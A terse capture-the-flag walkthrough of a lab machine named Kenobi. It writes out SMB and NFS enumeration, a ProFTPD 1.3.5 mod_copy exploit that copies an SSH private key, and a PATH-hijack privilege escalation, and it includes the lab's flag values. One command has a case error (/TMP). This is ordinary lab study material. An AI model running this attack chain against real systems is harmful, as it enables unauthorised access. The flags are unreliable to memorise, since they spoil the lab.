```
Kenobi - 10.10.178.21
```

#Ports Open - 21,22,80,111,139,445,2049

#Detail of Ports
>21		ftp
>22		ssh
>80		http
>111	rpc
>139	smb
>2049	rpc

#Findings + Exploitationlooked at smb shares
>first looked at smb shares using enum4linux
>found anonymous share
>used this to get the contents of it
	smbclient //<ip>/<share_name> -u <username>
>found log.txt file with ftp,smb info
>checked for mounted disks because found port 111 had some nfs mounts
>used this to find info on it
	nmap -p <port> --script=nfs-ls,nfs-statfs,nfs-showmount <ip>
>so we know there is a mounted folder '/var' and an exploit for 'ProFTPD 1.3.5'
>using nc connect to FTP so we can exploit
>using the exploit, use the following commands
	nc <ip> <port>
	SITE CPFR <id_rsa location>
	SITE CPTO </var/tmp>
>now mount the '/var' folder
>first create a folder in '/mnt' directory to mount at
	sudo mkdir /mnt/kenobi
>use this
	sudo mount <ip>:/var /mnt/kenobi
>now navigate to it to read the 'id_rsa'
	cat /mnt/kenobi/tmp/id_rsa
>use ssh to get in the system
>found user.txt
	d0b0f3f53b6caa532a83915e19224899
>found a binary 'menu' running
>ran strings on it to find waht its doing
>found these three commands being used
	curl -I localhost
	uname -r
	ifconfig
>so changed the curl command, gave root perms and added it to path
>use this
	cd /tmp
	echo 'cat /root/root.txt' > curl
	chmod 777 curl
	export PATH=/TMP:$PATH
	/usr/bin/menu
	1
>got ROOT!!!
	177b3cd8562289f37382721c28381f02